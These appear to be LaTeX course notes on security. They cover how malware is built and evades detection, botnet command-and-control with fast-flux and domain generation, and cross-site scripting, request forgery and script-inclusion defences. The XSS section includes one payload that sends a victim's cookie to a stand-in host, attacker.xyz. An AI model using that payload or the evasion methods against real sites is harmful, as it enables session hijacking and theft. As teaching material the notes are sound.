\section{Malware creation \& Botnets}

\pgra{Malware live-demo:} freeware construction kits are available (require no expertise), tools have generally very high built-in security mechanisms (strong crypto, auth.) $\to$ prevent detection/takeover by competitors

\pgra{Malware business case:} (1) persist \& avoid detection (password interception, steal valuable info) $\to$ (2) move to active attacks (further monetize, risk of detection justified) $\to$ (3) ``Throw away agent'' (sell/rent to clueless idiots)

\pgra{Exploitation phases:}
\begin{enumerate}
\item ID theft (keylogger, local proxy/sniffer, PII stealing)
\item Peer \& social attacks (trust misuse, social context)
\item Local attacks (attack LAN, intranet, VPN, USB stick propagation)
\item Attack support (host malware, proxying)
\item External attacks (scanning, send spam, DDoS)
\end{enumerate}

\pgra{Best utilization:} BUILD UP (efficiently \& spread infection) $\to$ PERSIST (prevent detection \& removal) $\to$ BE MODULAR (address changing functionality needs) $\to$ SCALE (handle many machines) $\to$ ADAPT (to business/tech challenges) $\to$ ANONYMIZE (prevent identification of operator) 

\pgra{Detection evasion techniques:} The following help malware to stay undetected:
\bitem{
\item Create unique samples of malware at massive scale ($20.000+$ variants) doing the same thing $\Rightarrow$ polymorphism
\item Protect from analysis (icing)
\item Detect sandboxing technologies
\item Test detectability
}

\pgra{Serial Variants/Permutation:} automatically spitting out new variants of malware on a massive scale.\\
As soon as anti-vir. detects a batch of malware samples, release a new (undetected) batch.

Stages:
\begin{enumerate}
\item Original malware: write code, hire coder, buy it, do-it-yourself kit
\item Cryptors: encrypt $\to$ evade signature detection, make static analysis inefficient, partially (sector-wise) encrypt software
\item Protectors: anti-debugging (monitor processes, timestamps, self-debug), anti-sandboxing
\item Packers: make binary code smaller/more portable, speed up infection (detection harder), polymorphic output (different output every time malware is packed)
\item Binders: embed malware in executables frequently downloaded \& searched for
\item Quality assurance: run malware against anti-vir. engines using underground tools, throw away if detected
\end{enumerate} 

\pgra{Polymorphism:} mutation of code while keeping the original algorithms intact (providing a common functionality).\\
Swap equivalent code constructs ({\tt while} with {\tt for}, etc.), change code order, insert noise (i.e. {\tt if(!sqrt(a) < 0) }), modify compiler settings

\pgra{Arms race:} $286 \cdot 10^{6}$ samples found in 2010.\\
25\% of 123 exploits missed by top 10 prevention programs.\\
40\% missed after slight modifications of exploits.\\
9\% of enterprise endpoints bot-infected.

\subs{Botnets}

\pgra{Definition:} a network of compromised machines (bots) getting instructions from a command \& control center (botmaster, mothership).

\pgra{C \& C:} is usually well hidden behind some distributed and redundant proxies, that are relaying commands from the botmaster to the network of managed bots (workers).

The botmaster needs to be able to
\bitem{
\item distribute new instructions and malicious capabilities
\item robustly manage $10,000+$ globally distributed agents,
\item resist attacks (hijacks) by competitors and/or researchers
}

\pgra{Bot command models:} \textit{No control:} default malicious behavior, self-propagation. \\
\textit{Private channels:} custom and covert channels, abuse common protocols\\
\textit{Public channels:} use commond applications APIs, 95\% of today's botnets \\
\textit{Resilient hybrids:} default malicious behavior, fall-back plans if C\&C  unavailable 

\pgra{Topologies:} A botnet will employ some form of the following topologies:

\lbtab{0.2}{0.35}{0.35}{
Type & Advantage & Disadvantage \\
\hline
\hline
\textbf{Star} & Speed & Single point of failure \\
\hline
\textbf{Multi-server} & Geographical optimization. No single point of failure & Advanced planning required \\
\hline
\textbf{Hierarchical} & Botnet enumeration very difficult. Easy to rescale & Command latency \\
\hline
\textbf{p2p (random)} & Highly resilient & Command latency. Botnet enumeration possible (``mapping out''). Needs auth. mechanism for identification of C\&C commands \\
}

\pgra{IP Flux \& Domain Flux:} \emph{IP Flux:} constant change of IP addr. info related to particular FQDN ({\tt cnc.net} $\to$ multiple IPs). ``Fast-Flux'': change of IP addr. set every 3-5 minutes. \\
\emph{Domain Flux:} constant change and alloc. of multiple FQDN ({\tt cnc.net, cnc.ru, abc.net} $\to$ multiple IPs).

\pgra{Single Flux:} FQDN of the C\&C's host has multiple IP addresses (DNS {\tt A} records).

\pgra{Double Flux:} Multiple nameservers of C\&C have multiple IP addr. assigned (DNS {\tt A} and {\tt NS} records)

\pgra{DNS protocol features exploited:} round robin allocation of IPs, very short TTL (time to live) for IPs

\pgra{Domain Flux:}
\bitem{
\item DGA (Domain Generation Algorithm) used by bot(s) to periodically compute a list of new domain names (for the C\&C)
\item DGA computed independently and regenerated periodically
\item Bots attempt to connect to hosts in generated list until successful
\item If a domain gets blocked $\to$ go to next in list
}

\textbf{Botmaster needs at least one domain operational.}

\pgra{Sinkholing:} attempt to take down/over botnet by registering domains found in DGA.\\
\emph{Requirements:} reverse-engineering the DGA, breaking/figuring out the auth. mechanism for the C\&C

\textit{Generally too expensive to register all domains in DGA (90-130 million \$). The bot operators have a giant advantage!}

\section{Cross-Site Scripting (XSS)}

\pgra{Browser/JavaScript Same-Origin Policy} Same-origin policy defines access rights: A script can
only access content and properties of a document loaded from the same origin as the document containing the script. Same origin means: same protocol, same hostname, same port.\\ Examples: script in a document loaded from {\tt site.tld} can access documents {\tt site.tld/here} \& {\tt site.tld/a/there} but not {\tt site.tld:8080/there} or {\tt bank.tld/yonder}.\\
\textbf{Never include scripts you don‘t trust:} \\
{\tt <script src=“http://you.tld/cnt.js“></script>}

the script loaded from {\tt you.tld} is evaluated in the context of origin {\tt me.tld}! 

\pgra{Cross-Site Scripting (XSS) Attacks:} \textit{XSS Vulnerability:} ``XSS flaws'' occur whenever a web application takes user supplied data and sends it to a web browser without first validating that content.\\
\textit{XSS Attack:} 
\begin{enumerate}
\item XSS vulnerability used to inject code into a web page
\item Code is executed in the victim‘s browser under the web site‘s domain (hijack user sessions, deface web sites, introduce worms)
\end{enumerate}

\textit{XSS attack targets the user of the system rather than the system itself (unlike SQL injection).}

\pgra{Means to feed XSS exploit code:} XSS code can be embedded in: email, forum or chat message, PDF/Word and similar documents, uploaded file (CSS), webpage with third party content (Ads, user content, counters) \\
XSS Attack examples: Change look of website, auto-post messages in the name of some other user

\pgra{Root causes for XSS:} there are two primary root causes for XSS

\lbtab{0.3}{0.3}{0.3}{
Cause & Remedy & Problems \\
\hline
\hline
Partial or missing user input sanitization & Attempt to filter out meta-characters ({\tt <, >, / } etc.) & Blacklisting complicated/incomplete, appl. becomes less user-friendly \\
\hline
Partial or missing HTML output encoding & Ensure that every user supplied parameter is HTML output encoded before it is send to the web browser ({\tt <} $\mapsto$ {\tt \&lt;}) & \\
}

\pgra{Usual places for Javascript:}
\begin{enumerate}
\item Inline code block as part of a web page
\item Including an external file containing javascript
\item Executing javascript code when an event is triggered.
\end{enumerate}

\pgra{How to prevent XSS in your web app:} HTML Output encoding (escaping) is good, but not always sufficient. Consider also:
\bitem{
\item Attribute injection: e.g. {\tt <img src=\% (image\_url)s>}
\item Style attributes: inject javascript code into style attr. 
\item Tags injection
\item Different character sets
\item Javascript event handlers (onerror, onescape, etc)
\item AJAX applications
}

\pgra{Protecting against XSS attacks}
\bitem{
\item Golden rule: Do proper HTML output encoding of any user input: replace {\tt <script>alert("XSS");</script>} with {\tt \%lt;script\&gt;alert(\&quot;XSS\&quot;);} 
\\{\tt \&lt;/script\&gt}
\item ASP.NET: Use {\tt HTTPUtility.HTMLEncode(foo)} and validate user input
\item PHP: use {\tt htmlentities(foo)} for HTML output encoding, and {\tt urlencode(foo)} for GET arguments
\item Ruby: use {\tt h(foo)}
\item JSP: Use Struts with {\tt <bean:write...>}
\item Perl: Use Template Toolkit {\tt [\% HTML.escape(foo) \%]}
}

\pgra{Defense overview:} Summarizing:

\begin{tabular}{p{0.15\linewidth}p{0.17\linewidth}p{0.13\linewidth}p{0.4\linewidth}}
Output encoding & Input validation & Security token & Other prevention mechanisms \\
\hline
\hline
\multicolumn{4}{l}{\textbf{Cross-Site Scripting (XSS)}} \\
\hline
Yes & Yes & No & Don't expect user input to be valid \& sanitized \\
\multicolumn{4}{l}{\textbf{Cross-Site Request Forgery (XSRF)}} \\
\hline
No & (Yes) & Yes & Ask for old password/CAPTCHA. Check HTTP REFERER \\
\multicolumn{4}{l}{\textbf{Cross-Site Script Inclusion (XSSI): direct sourcing}} \\
\hline
No & No & No & Don't ever include untrusted code. Serve code from your own website after checking it. \\
\multicolumn{4}{l}{\textbf{Cross-Site Script Inclusion (XSSI): call-back}} \\
\hline
No & No & Yes & Restrict requests to HTTP POST. Check HTTP REFERER \\
\end{tabular}

\pgra{MySpace XSS Worm:} {\tt javascript} stripped from any text, but not {\tt java[enter]script}

\pgra{Data Leakage XSS Attack:} {\tt Sillyshop.xyz} has a XSS flaw that embeds URL in {\tt prod\_id}

http://www.sillyshop.xyz/showproduct.asp?prod\_id=7\\
$<$script$>$document.write('$<$img\%20src=\\
"http://www.attacker.xyz/capture.php?cookie=',\\
escape(document.cookie),'"$>$')$<$/script$>$

Malicious actions: get victim‘s cookie and alter orders, purchase with his credit card, reset account pwd, etc.

\pgra{XSS Prevention:} HttpOnly cookies, can‘t be read by client script, not widely supported parameter in webpage

\pgra{XSRF - Cross-Site Request Forgery:} A form from one domain posts a request to a different domain through an authenticated session. Website {\tt attacker.tld} uses a form in a hidden {\tt iframe} to automatically post a new password to a web service, where the victim is currently logged in. \textit{Write-only attack.}\\
\textit{Remedy:} Use a hidden security token, ask for old password, captcha, http referer headers

\pgra{XSSI - Cross Site Script Inclusion:} Information leakage via callback/dynamic script. Prevent with security token, restriction of requests to HTTP POST, check HTTP REFERER